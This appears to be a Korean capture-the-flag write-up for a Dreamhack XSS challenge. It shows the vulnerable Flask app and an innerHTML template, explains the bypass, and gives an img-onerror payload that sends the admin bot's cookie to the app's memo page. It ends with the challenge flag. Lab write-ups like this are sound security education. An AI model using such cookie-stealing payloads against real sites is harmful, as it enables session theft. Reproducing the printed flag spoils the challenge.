---
title: "[Dreamhack] XSS Filtering Bypass 해설"
author: jyp
date: 2026-06-09 12:00:00 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

# 문제 특징

> XSS를 사용한 해킹 & 금지 태그 우회

## **난이도**: Lv.1
## **카테고리**: 웹해킹

---

# 문제 구조

## 문제파일구성

```
/
├── app.py
├── static
│   #생략
└── templates
    #생략
```

## 주요 코드 

```python

#app.py

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    return render_template("vuln.html")


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


```


{% raw %}
```html
# /templates/vuln.html

{% extends "base.html" %}
{% block title %}Index{% endblock %}

{% block head %}
  {{ super() }}
  <style type="text/css">
    .important { color: #336699; }
  </style>
{% endblock %}

{% block content %}
    <div id='vuln'></div>
    <script>var x=new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>
{% endblock %}

```
{% endraw %}


이 문제는 문제의 제목 그대로 `XSS`를 활용하는 문제로, 봇(어드민)이 취약점이 존재하는 `/vuln` 주소로 접속하게 하여 특정 스크립트를 실행하게 만드는 문제이다.


# 풀이

## XSS란? By claude code
**XSS (Cross-Site Scripting)**는 공격자가 웹 페이지에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행시키는 웹 보안 취약점입니다.

## 웹 주소에 스크립트를 작성하여 플래그 탈취

`/vuln`주소에서는 `'param'`이라는 파라미터에 적혀있는 내용물을 id = vuln인 div 태그 속에 집어넣는다.
이때, `/vuln`주소의 `param`파라미터에 페이로드를 작성하여 div태그 속에서 악성 코드가 작동되도록 한다.

## 페이로드

`<img src=x onerror="location.href='http://127.0.0.1:8000/memo?memo='+document.cookie">`

위 페이로드를 `/flag` 주소의 `<input>`에 입력하거나, param이라는 파라미터에 해당 페이로드를 작성하여 `POST`요청을 보내면 해킹에 성공한다.
vuln.html의 파일을 보면 Innerhtml이라는 함수가 있는데 해당 함수는
`<script>`속에서 작성되는 코드만 막혀 있고, 다른 태그들에 존재하는 이벤트 핸들러 속 스크립트를 작동하지 않게 하는 기능은 없다. 따라서 `<img>`태그를 가져오고, 의도적으로 오류가 발생하게 하여 `onerror`라는 이벤트 핸들러를 작동하게 하여 페이로드를 실행시킬 수 있게 만든다.

## 작동 시연

![작동1](https://github.com/user-attachments/assets/0eb5c02e-aa6b-4c4f-8963-9578b5291f8a)
![작동2](https://github.com/user-attachments/assets/8f8243f0-6b74-4b97-a8e7-77683d789287)



# 정답

DH{3c01577e9542ec24d68ba0ffb846508f}

